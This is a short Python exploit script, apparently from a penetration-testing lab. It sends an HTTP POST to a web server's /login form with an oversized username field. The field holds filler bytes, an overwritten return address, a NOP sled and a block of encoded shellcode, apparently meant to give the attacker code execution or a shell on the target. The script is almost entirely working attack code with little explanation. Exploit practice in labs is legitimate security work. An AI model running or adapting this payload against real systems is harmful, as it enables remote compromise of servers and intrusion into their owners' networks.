#!/usr/bin/python

import socket

shellcode = (
"\xba\x79\xf4\xbe\xba\xda\xd8\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x31\x57\x12\x83\xc7\x04\x03\x2e\xfa\x5c\x4f\x2c\xea\x23"
"\xb0\xcc\xeb\x43\x38\x29\xda\x43\x5e\x3a\x4d\x74\x14\x6e\x62"
"\xff\x78\x9a\xf1\x8d\x54\xad\xb2\x38\x83\x80\x43\x10\xf7\x83"
"\xc7\x6b\x24\x63\xf9\xa3\x39\x62\x3e\xd9\xb0\x36\x97\x95\x67"
"\xa6\x9c\xe0\xbb\x4d\xee\xe5\xbb\xb2\xa7\x04\xed\x65\xb3\x5e"
"\x2d\x84\x10\xeb\x64\x9e\x75\xd6\x3f\x15\x4d\xac\xc1\xff\x9f"
"\x4d\x6d\x3e\x10\xbc\x6f\x07\x97\x5f\x1a\x71\xeb\xe2\x1d\x46"
"\x91\x38\xab\x5c\x31\xca\x0b\xb8\xc3\x1f\xcd\x4b\xcf\xd4\x99"
"\x13\xcc\xeb\x4e\x28\xe8\x60\x71\xfe\x78\x32\x56\xda\x21\xe0"
"\xf7\x7b\x8c\x47\x07\x9b\x6f\x37\xad\xd0\x82\x2c\xdc\xbb\xca"
"\x81\xed\x43\x0b\x8e\x66\x30\x39\x11\xdd\xde\x71\xda\xfb\x19"
"\x75\xf1\xbc\xb5\x88\xfa\xbc\x9c\x4e\xae\xec\xb6\x67\xcf\x66"
"\x46\x87\x1a\x28\x16\x27\xf5\x89\xc6\x87\xa5\x61\x0c\x08\x99"
"\x92\x2f\xc2\xb2\x39\xca\x85\x7c\x15\xa3\x94\x15\x64\x4b\x16"
"\x5d\xe1\xad\x72\xb1\xa4\x66\xeb\x28\xed\xfc\x8a\xb5\x3b\x79"
"\x8c\x3e\xc8\x7e\x43\xb7\xa5\x6c\x34\x37\xf0\xce\x93\x48\x2e"
"\x66\x7f\xda\xb5\x76\xf6\xc7\x61\x21\x5f\x39\x78\xa7\x4d\x60"
"\xd2\xd5\x8f\xf4\x1d\x5d\x54\xc5\xa0\x5c\x19\x71\x87\x4e\xe7"
"\x7a\x83\x3a\xb7\x2c\x5d\x94\x71\x87\x2f\x4e\x28\x74\xe6\x06"
"\xad\xb6\x39\x50\xb2\x92\xcf\xbc\x03\x4b\x96\xc3\xac\x1b\x1e"
"\xbc\xd0\xbb\xe1\x17\x51\xcb\xab\x35\xf0\x44\x72\xac\x40\x09"
"\x85\x1b\x86\x34\x06\xa9\x77\xc3\x16\xd8\x72\x8f\x90\x31\x0f"
"\x80\x74\x35\xbc\xa1\x5c")

try:
    print("\nSending evil buffer...")

    filler = "A" * 780
    eip =    "\x83\x0c\x09\x10"     # The address is in reverse order, because of endian byte order
    offset = "C" * 4
    nops   = "\x90" * 10  # No Operation instructions to avoid corrupting shellcode with GetPC

    inputBuffer = filler + eip + offset + nops + shellcode
    content = "username=" + inputBuffer + "&password=A"

    buffer =  "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.11.0.22\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.192.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.193.10", 80))
    s.send(buffer)
    s.close()
    print("\nDone!")

except:
    print("Could not connect!")

